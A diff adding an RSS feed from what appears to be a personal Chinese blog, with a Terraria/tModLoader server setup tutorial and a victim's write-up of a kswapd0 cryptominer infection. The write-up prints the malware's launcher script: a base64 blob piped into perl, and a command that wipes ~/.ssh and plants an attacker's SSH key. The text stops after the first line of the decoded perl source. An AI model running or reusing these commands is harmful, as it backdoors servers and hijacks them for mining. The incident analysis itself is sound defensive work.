@@ -1,0 +1,473 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>游戏 on sy ^_^</title><link>https://example.com/tags/%E6%B8%B8%E6%88%8F/</link><description>Recent content in 游戏 on sy ^_^</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Tue, 28 Jun 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://example.com/tags/%E6%B8%B8%E6%88%8F/index.xml" rel="self" type="application/rss+xml"/><item><title>Terraria</title><link>https://example.com/p/terraria/</link><pubDate>Tue, 28 Jun 2022 00:00:00 +0000</pubDate><guid>https://example.com/p/terraria/</guid><description>&lt;img src="https://example.com/post/Terraria/Photo.png" alt="Featured image of post Terraria" />&lt;h1 id="terraria-linux-服务器搭建支持-mod-">Terraria Linux 服务器搭建（支持 mod ）&lt;/h1>
+&lt;h2 id="简介">简介&lt;/h2>
+&lt;p>泰拉瑞亚 1.4 Linux 服务器搭建， TmodLoader（后简称 TML） 1.4 服务器搭建（支持mod），面向只有一点点 Linux 基础的小伙伴。&lt;/p>
+&lt;p>如果只是 TML 运行后一直在 &lt;strong>下载&lt;/strong> 或者 &lt;strong>5分钟没反应&lt;/strong> 这个问题（win 和 Linux 通用），可以直接看 TML 安装的最后部分。&lt;/p>
+&lt;p>网上泰拉服务器教程已经很多了，但是都基本都是 1.3 版本， TML 基本在 0.11.8.9 版本之前，这次本体更新到 1.4 版本，TML更新到 v2022.05.103.34 版本（本文写于2022.6.28）后有了较大的变化，搭建过程中我也走了很多弯路，所以写一篇文章，希望对大家有帮助。&lt;/p>
+&lt;p>服务器优势还是很大的，可以最大支持16个人，可以长期挂载，可以同时开多个资源世界等。&lt;/p>
+&lt;h2 id="环境说明">环境说明&lt;/h2>
+&lt;p>服务器 ：腾讯云 8 核 4 G（如果要安装 TML 建议服务器 在 2核2G 以上）、操作系统 debain 11&lt;/p>
+&lt;p>游戏本体：steam上的 Terraria 1.4.3.6 ，TML v2022.05.103.34&lt;/p>
+&lt;p>泰拉的服务器端是免费的，在 &lt;a class="link" href="https://terraria.org/" target="_blank" rel="noopener"
+>官网&lt;/a> 或者 &lt;a class="link" href="https://terraria.fandom.com/zh/wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8#.E5.BC.80.E6.9C.8D.E6.96.B9.E6.B3.95_.28Linux.29" target="_blank" rel="noopener"
+>Terraria wiki&lt;/a>， TML 在 &lt;a class="link" href="https://github.com/tModLoader/tModLoader/releases" target="_blank" rel="noopener"
+>GitHub&lt;/a> 获得最新版，也有封装完整的 &lt;a class="link" href="https://hub.docker.com/search?q=terraria" target="_blank" rel="noopener"
+>docker&lt;/a> 镜像供大家使用（这个方法我没有试过）&lt;/p>
+&lt;p>我这里推荐和使用的是利用 steamcmd 的方法，先说一下优势：&lt;/p>
+&lt;ol>
+&lt;li>服务器与桌面端版本统一方便。&lt;/li>
+&lt;li>版本更新方便，steamcmd 有专门的指令更新游戏，而别的方法需要重新下载安装。&lt;/li>
+&lt;li>1.4 版本后的 TML 支持创意工坊直接导入 mod ，这个在服务器端也生效！！！&lt;/li>
+&lt;/ol>
+&lt;h2 id="服务器搭建">服务器搭建&lt;/h2>
+&lt;h3 id="安装-steamcmdhttpsdevelopervalvesoftwarecomwikisteamcmdzh-cnlinux">安装 &lt;a class="link" href="https://developer.valvesoftware.com/wiki/SteamCMD:zh-cn#Linux" target="_blank" rel="noopener"
+>steamcmd&lt;/a>&lt;/h3>
+&lt;p>习惯看文档的请看文档，里面比较详细（支持中文）, 内含 docker 安装方法。&lt;/p>
+&lt;p>创建一个名为 steam 的用户帐户以安全地运行 SteamCMD，并将其与操作系统的其余部分隔离。&lt;strong>以 root 用户身份登录时请勿运行 steamcmd——这样做会带来安全风险&lt;/strong>。&lt;/p>
+&lt;ol>
+&lt;li>以 root 用户身份创建 steam 用户：&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">useradd -m steam
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 添加密码&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">passwd steam
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ol start="2">
+&lt;li>进入其文件夹&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> /home/steam
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 或者 &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">su steam
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bash &lt;span class="c1"># 切换到 bash 以保证命令行体验&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> ~
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 64 位机需要&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo add-apt-repository multiverse
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo dpkg --add-architecture i386
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo apt update
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo apt install lib32gcc1 steamcmd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ol start="3">
+&lt;li>安装&lt;/li>
+&lt;/ol>
+&lt;p>Ubuntu/Debian&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo apt install steamcmd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ol start="4">
+&lt;li>链接 steamcmd 可执行文件：&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">ln -s /usr/games/steamcmd steamcmd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ol start="5">
+&lt;li>运行 Steamcmd&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> ~
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">steamcmd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>正常情况下你会看到&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/Terraria/steam0"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;p>输入&lt;code>login + 你的用户名&lt;/code> 然后按提示登录即可（第一次登录会需要令牌）&lt;/p>
+&lt;p>安装 terraria&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">app_update &lt;span class="m">105600&lt;/span> &lt;span class="c1"># 安装 Terraria(它在steam中的代码是 105600，不会改变)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>下载完成后你应该可以在 &lt;code>~/Steam/steamapps/common&lt;/code> 下面看到 Terraria 文件夹&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/Terraria/steam1"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;p>里面的 &lt;code>TerrariaServer.bin.x86_64&lt;/code> 就是服务器运行文件了&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 新建会话&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">screen -S Tr
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./TerrariaServer.bin.x86_64
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>然后就可以开始的愉快游戏了，&lt;a class="link" href="https://www.bilibili.com/read/cv16191402" target="_blank" rel="noopener"
+>常用指令&lt;/a>&lt;/p>
+&lt;h2 id="tml-搭建">TML 搭建&lt;/h2>
+&lt;p>这个需要在本体完成的基础上进行&lt;/p>
+&lt;p>如何查找游戏在steam中的代码&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/Terraria/steam2"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;p>我们可以看到 TML 的代码是 1281930 版本是 8980144， 所以&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># app_update &amp;lt;应用ID&amp;gt; [-beta &amp;lt;测试名称&amp;gt;] [-betapassword &amp;lt;密码&amp;gt;] [validate]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">app_update &lt;span class="m">1281930&lt;/span> &lt;span class="m">8980144&lt;/span> validate &lt;span class="c1"># 如果发现安装有问题请加 validate&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>下载完成后，同样进入 TML 文件夹&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/Terraria/steam3"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 新建会话&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">screen -S Tr
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./start-tModLoaderServer.sh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="最大的问题来了">！！！最大的问题来了&lt;/h3>
+&lt;p>这里演示的是 windows 下的情况，Linux服务端一样，只不过服务器上可以多看到下载信息，在下载 .net 但是国内服务器应该是下载不下来的，所以会等到死。&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/Terraria/steam4"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;p>windows 和 Linux 解决方法一样，&lt;a class="link" href="https://dotnet.microsoft.com/zh-cn/download" target="_blank" rel="noopener"
+>下载 .net&lt;/a>&lt;/p>
+&lt;p>我们可以在 TML 内的 &lt;code>dotnet/6.0.0&lt;/code> 内看到里面是空的，所以我们要手动下载二进制文件包，丢进去&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> ~/Steam/steamapps/common/tModLoader/dotnet/6.0.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 下载二进制文件&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wget https://dotnet.microsoft.com/zh-cn/download/dotnet/thank-you/sdk-6.0.301-linux-x64-binaries
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 解压文件&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tar -zxvf dotnet-sdk-6.0.301-linux-x64.tar.gz
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>windows 下操作同理&lt;/p>
+&lt;p>然后运行即可
+steam 的最大优势是 TML 内的mod就是 改登录的steam账号内 TML 订阅的mod，如果需要更新&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">app_update &lt;span class="m">1281930&lt;/span> validate
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>已经成功和小伙伴玩上 1.4 版本的 &lt;strong>灾厄mod&lt;/strong> ，请注意服务器mod与主机端应当相同。&lt;/p>
+&lt;p>本文主要是为了介绍 TML 1.4 运行不起来的解决方法，下面的参考链接介绍会更为详细&lt;/p>
+&lt;p>参考连接：
+&lt;a class="link" href="https://zerol.me/2020/02/08/Terraria-Server-With-Mods/" target="_blank" rel="noopener"
+>泰拉瑞亚服务器搭建教程（带 MOD）&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://zhuanlan.zhihu.com/p/94570876" target="_blank" rel="noopener"
+>使用Linux搭建Terraria服务器，详细步骤&lt;/a>&lt;/p></description></item><item><title>Kswapd0挖矿病毒记录</title><link>https://example.com/p/kswapd0%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E8%AE%B0%E5%BD%95/</link><pubDate>Mon, 07 Mar 2022 00:00:00 +0000</pubDate><guid>https://example.com/p/kswapd0%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E8%AE%B0%E5%BD%95/</guid><description>&lt;img src="https://example.com/post/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%97%85%E6%AF%92/qq_pic_merged_1646629112550.jpg" alt="Featured image of post Kswapd0挖矿病毒记录" />&lt;h1 id="kswapd0-挖矿病毒调查">kswapd0 挖矿病毒调查&lt;/h1>
+&lt;h2 id="背景">背景&lt;/h2>
+&lt;p>&lt;img src="https://example.com/../../post/%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%97%85%e6%af%92/qq_pic_merged_1646629081866.jpg"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;p>3 月 6 日收到了腾讯云的异地异常登入报告，马上又收到了检测出木马的报告&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%97%85%e6%af%92/qq_pic_merged_1646629112550.jpg"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;p>马上怀疑是服务器被植入了木马程序，但是时间比较晚了，先把服务器关机了然后睡觉&lt;/p>
+&lt;p>我也没有急着重装系统，有点贪心，想看看木马长什么样，也顺便学习一下怎么清理木马程序，怎么分析受损情况，毕竟我现在是一个个人的服务器还没有对外提供服务，可以随便重装系统，但是如果是一个网站的服务器那么肯定是不能随便重装的。&lt;/p>
+&lt;p>但是这个木马非常狡猾，我 3 月 6 日一天也没有找出来，也请了网安的同学来帮忙，外加腾讯给我的报错文件，我什么没有找到，一切看起来都非常正常，各种日志都没有一点痕迹连操作记录都没有，然后我就又把服务器开着等了一天。&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%97%85%e6%af%92/qq_pic_merged_1646629166670.jpg"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;h2 id="出现异常">出现异常&lt;/h2>
+&lt;p>很快，第二天凌晨又被警告异地登入了，但是我当时还在睡觉没处理，早上起来一开服务器发现问题大了。&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%97%85%e6%af%92/QQ%e5%9b%be%e7%89%8720220307131114.jpg"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%97%85%e6%af%92/QQ%e5%9b%be%e7%89%8720220307131210.png"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;h2 id="开始调查">开始调查&lt;/h2>
+&lt;p>有个程序把我的cpu直接占满了，我知道它出现了，我直接 kill 了这个程序，然后在通过查看系统的定期任务找到了它的文件，应该是只有部分了，它的很多安装步骤应该是被自己清理掉了。&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%97%85%e6%af%92/Snipaste_2022-03-07_10-40-46.png"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;p>很明显它有一些定时任务，而且我每一次开机都会更新一些木马的程序，非常难找，而且输出全部重定向到了空，所以没有运行日志，当然也它没有很过分的写 shell 反弹，否在我恐怕也不能直接发现这些定期运行的脚本了。&lt;/p>
+&lt;p>然后根据上面运行的脚本目录，我找到了它的一些文件&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%97%85%e6%af%92/Snipaste_2022-03-07_10-42-11.png"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%97%85%e6%af%92/Snipaste_2022-03-07_10-42-35.png"
+loading="lazy"
+alt="ALt"
+>&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%97%85%e6%af%92/Snipaste_2022-03-07_10-42-55.png"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%97%85%e6%af%92/Snipaste_2022-03-07_10-44-39.png"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%97%85%e6%af%92/Snipaste_2022-03-07_10-46-04.png"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%97%85%e6%af%92/Snipaste_2022-03-07_10-51-52.png"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;p>里面有很多脚本程序，比如启动挖矿程序，为了躲避产生日志的脚本，还有一些判断系统硬件的，还有脚本杀死别的挖矿软件……，还有删除一些文件的（所以应该丢失了不少关键文件）&lt;/p>
+&lt;p>当然最重要的还是要看一下挖矿程序(省略)&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#!/bin/sh
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>nohup ./stop&amp;gt;&amp;gt;/dev/null &lt;span class="p">&amp;amp;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sleep &lt;span class="m">5&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ZXZhbCB1bnBhY2sgd......&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> base64 --decode &lt;span class="p">|&lt;/span> perl
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> ~ &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> rm -rf .ssh &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> mkdir .ssh &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr&amp;#34;&lt;/span>&amp;gt;&amp;gt;.ssh/authorized_keys &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> chmod -R &lt;span class="nv">go&lt;/span>&lt;span class="o">=&lt;/span> ~/.ssh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>有一个用 &lt;code>perl&lt;/code> 写的程序还有一个 &lt;code>ssh&lt;/code> 远程登入&lt;/p>
+&lt;p>因为是 &lt;code>base64&lt;/code> 压缩，所以通过解码并且将 &lt;code>perl&lt;/code> 加入输出命令得到了源码（部分）&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;span class="lnt">66
+&lt;/span>&lt;span class="lnt">67
+&lt;/span>&lt;span class="lnt">68
+&lt;/span>&lt;span class="lnt">69
+&lt;/span>&lt;span class="lnt">70
+&lt;/span>&lt;span class="lnt">71
+&lt;/span>&lt;span class="lnt">72
+&lt;/span>&lt;span class="lnt">73
+&lt;/span>&lt;span class="lnt">74
+&lt;/span>&lt;span class="lnt">75
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-perl" data-lang="perl">&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">$processo&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#39;rsync&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
